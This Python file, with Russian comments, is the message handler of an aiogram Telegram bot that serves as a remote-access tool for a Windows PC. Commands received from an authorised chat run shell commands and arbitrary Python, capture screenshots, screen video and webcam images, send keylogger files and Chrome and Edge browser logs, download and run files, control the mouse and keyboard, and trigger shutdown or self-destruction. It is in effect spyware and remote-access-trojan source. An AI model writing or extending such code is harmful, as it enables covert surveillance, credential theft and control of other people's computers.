import re
import logging
from commands import *
from aiogram import Bot
import asyncio
from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup
from aiogram.types import Message, FSInputFile, CallbackQuery

HOTKEY_PAGES = [
    [
        ("Ctrl+C", "ctrl+c"),
        ("Ctrl+V", "ctrl+v"),
        ("Ctrl+X", "ctrl+x"),
        ("Ctrl+Z", "ctrl+z"),
        ("Ctrl+A", "ctrl+a"),
        ("Ctrl+S", "ctrl+s"),
        ("Alt+Tab", "alt+tab"),
        ("Alt+F4", "alt+f4"),
        ("Next ➡️", "page_1")
    ],
    [
        ("Win", "win"),
        ("Win+E", "win+e"),
        ("Win+D", "win+d"),
        ("Win+L", "win+l"),
        ("Win+V", "win+v"),
        ("Tab", "tab"),
        ("Enter", "enter"),
        ("⬅️ Back", "page_0"),
        ("Next ➡️", "page_2")
    ],
    [
        ("Ctrl+T", "ctrl+t"),
        ("Ctrl+W", "ctrl+w"),
        ("Ctrl+Shift+T", "ctrl+shift+t"),
        ("Ctrl+L", "ctrl+l"),
        ("F5", "f5"),
        ("Ctrl+F", "ctrl+f"),
        ("Backspace", "backspace"),
        ("Esc", "esc"),
        ("Space", "space"),
        ("⬅️ Back", "page_1")
    ]
]


def build_keyboard(page_number=0):
    keyboard_buttons = []
    for text, callback in HOTKEY_PAGES[page_number]:
        keyboard_buttons.append([InlineKeyboardButton(text=text, callback_data=callback)])
    return InlineKeyboardMarkup(inline_keyboard=keyboard_buttons)


async def send_safe_message(bot: Bot, chat_id, message):
    while True:
        try:
            await bot.send_message(chat_id, message)
            break
        except:
            await asyncio.sleep(1)


async def send_safe_document(bot: Bot, chat_id, file_path):
    """Безопасная отправка документа с повторными попытками"""
    while True:
        try:
            await bot.send_document(chat_id, FSInputFile(file_path))
            break
        except:
            await asyncio.sleep(1)


async def send_file_and_cleanup(bot: Bot, chat_id, file_path, response_text=None):
    """Отправляет файл, удаляет его и возвращает текст ответа"""
    await send_safe_document(bot, chat_id, file_path)
    os.remove(file_path)
    return response_text


async def handle_hotkey_callback(callback: CallbackQuery, bot: Bot):
    """Обрабатывает нажатия на кнопки горячих клавиш"""
    data = callback.data

    # Переход по страницам
    if data.startswith("page_"):
        page_number = int(data.split("_")[1])
        await callback.message.edit_text(
            "🖥️ <b>Горячие клавиши Windows</b>\n\n"
            "Нажмите на нужную комбинацию для выполнения:",
            reply_markup=build_keyboard(page_number),
            parse_mode="HTML"
        )
        await callback.answer()
        return

    # Выполнение горячей клавиши
    try:
        result = execute_hotkey(data)
        await callback.answer(result, show_alert=False)

        await callback.message.edit_text(
            f"🖥️ <b>Горячие клавиши Windows</b>\n\n"
            f"✅ Выполнено: <code>{data}</code>\n\n"
            f"Нажмите на другую комбинацию для выполнения:",
            reply_markup=build_keyboard(0),
            parse_mode="HTML"
        )
    except Exception as e:
        await callback.answer(f"❌ Ошибка: {e}", show_alert=True)


async def handle_message(message: Message, bot: Bot):
    chat_id = message.chat.id
    if not checkchat_id(str(chat_id)):
        return

    if message.document:
        try:
            file_id = message.document.file_id
            file_name = message.document.file_name
            save_path = os.path.join(SCRIPTS_DIR, file_name)
            file = await bot.get_file(file_id)
            await bot.download_file(file.file_path, save_path)
            await bot.send_message(chat_id, f"Файл {file_name} успешно сохранён!")
        except Exception as e:
            logging.error(f"Ошибка скачивания файла: {e}")
            await bot.send_message(chat_id, f"Ошибка: {e}")
        return

    if message.photo:
        try:
            photo = message.photo[-1]
            file_id = photo.file_id

            file_name = f"CLICK.png"
            save_path = os.path.join(SCRIPTS_DIR, file_name)

            file = await bot.get_file(file_id)
            await bot.download_file(file.file_path, save_path)
            await bot.send_message(chat_id, f"✅ Фото сохранено как {file_name} в папку {SCRIPTS_DIR}")

        except Exception as e:
            logging.error(f"Ошибка скачивания фото: {e}")
            await bot.send_message(chat_id, f"❌ Ошибка сохранения фото: {e}")
        return

    if not message.text:
        return

    command = message.text.strip()
    response = ''

    try:
        if command == '/start':
            response = get_start_message()

        elif command == '/click_image':
            response = click_image()

        elif command == '/ping':
            response = ping()

        elif command == '/pc_info':
            response = get_pc_info()

        elif command == '/close_tabs':
            response = close_all_tabs()

        elif command == '/hot_keys':
            await bot.send_message(
                chat_id,
                "🖥️ <b>Горячие клавиши Windows</b>\n\n"
                "Нажмите на нужную комбинацию для выполнения:",
                reply_markup=build_keyboard(0),
                parse_mode="HTML"
            )
            return

        elif command == '/ip_info':
            info = get_ip_info()
            await bot.send_location(chat_id, *info['location'])
            response = info['text']

        elif command.startswith('/cmd_exec'):
            result = execute_cmd(command.replace('/cmd_exec', ''))
            temp_path = os.path.join(LOG_DIR, 'cmd_output.txt')
            with open(temp_path, 'w', encoding='utf-8') as f:
                f.write(result)
            await send_file_and_cleanup(bot, chat_id, temp_path)
            response = result[:700]

        elif command.startswith('/python_exec'):
            code = command.replace('/python_exec', '').strip()
            if not code:
                response = 'Использование: /python_exec <код>'
            else:
                path, result = python_exec(code)
                if path:
                    await send_file_and_cleanup(bot, chat_id, path)
                else:
                    response = result

        elif command == '/capture_pc':
            path, response = capture_pc()
            await send_file_and_cleanup(bot, chat_id, path)

        elif command.startswith('/video_pc'):
            parts = command.replace('/video_pc', '').strip()
            seconds = min(int(parts) if parts else 30, 500)
            path, response = record_screen(seconds)
            await send_file_and_cleanup(bot, chat_id, path)

        elif command == '/capture_webcam':
            path = capture_webcam()
            if path:
                await send_file_and_cleanup(bot, chat_id, path)
            else:
                response = 'Ошибка захвата с камеры'

        elif command.startswith('/msg_box'):
            msg = command.replace('/msg_box', '').strip()
            response = msg_box(msg)

        elif command.startswith('/message_write'):
            match = re.search(r'^/message_write\s+"(.+)"$', command)
            if match:
                response = message_write(match.group(1))
            else:
                response = 'Использование: /message_write "ваш текст"'

        elif command.startswith('/move_mouse_coord'):
            parts = command.replace('/move_mouse_coord', '').strip().split()
            if len(parts) == 2:
                x, y = int(parts[0]), int(parts[1])
                response = move_mouse_coord(x, y)
            else:
                response = 'Использование: /move_mouse_coord <x> <y>'

        elif command.startswith('/move_mouse'):
            parts = command.replace('/move_mouse', '').strip().split()
            if len(parts) == 2:
                direction, offset = parts
                result = move_mouse_direction(direction.lower(), offset)
                response = result if result else '❌ Направление должно быть: левее, правее, выше, ниже.'
            else:
                response = 'Использование: /move_mouse <направление> <пиксели>'

        elif command == '/click_mouse':
            response = click_mouse()

        elif command.startswith('/download'):
            path = command.replace('/download', '').strip()
            file_path = download_file(path)
            if file_path:
                await send_safe_document(bot, chat_id, file_path)
            else:
                response = f'Файл не найден: {path}'

        elif command.startswith('/run'):
            path = command.replace('/run', '').strip()
            response = run_file(path)

        elif command.startswith('/wallpaper'):
            path = command.replace('/wallpaper', '').strip()
            response = set_wallpaper(path)

        elif command.startswith('/ls'):
            path = command.replace('/ls', '').strip()
            response = list_directory(path)

        elif command.startswith('/open_browser'):
            parts = command.replace('/open_browser', '').strip().split(maxsplit=1)

            if len(parts) == 1:
                url = parts[0]
                response = open_browser(url)
            elif len(parts) == 0:
                response = open_browser()
            else:
                url = parts[0]
                response = open_browser(url)

        elif command == '/shutdown':
            response = shutdown()

        elif command == '/reboot':
            response = reboot()

        elif command == '/keylogs':
            await send_safe_document(bot, chat_id, KEYLOG_FILE)
            get_keylog_file()

        elif command == '/user_log':
            await send_safe_document(bot, chat_id, LOG_FILE)
            get_user_log_file()

        elif command == '/chrome_log':
            response = get_browser_log(browser='chrome')

        elif command == '/edge_log':
            response = get_browser_log(browser='edge')

        elif command == '/self_destruct':
            response = confirm_self_destruct()

        elif command == '/destroy':
            self_destruct()

        elif command.startswith('/create_more_folders'):
            parts = command.replace('/create_more_folders', '').strip().split()
            if len(parts) >= 3:
                response = create_desktop_folders(int(parts[0]), parts[1], parts[2])

    except Exception as e:
        response = f'⚠️ Ошибка: {e}'

    if response:
        await send_safe_message(bot, chat_id, response)

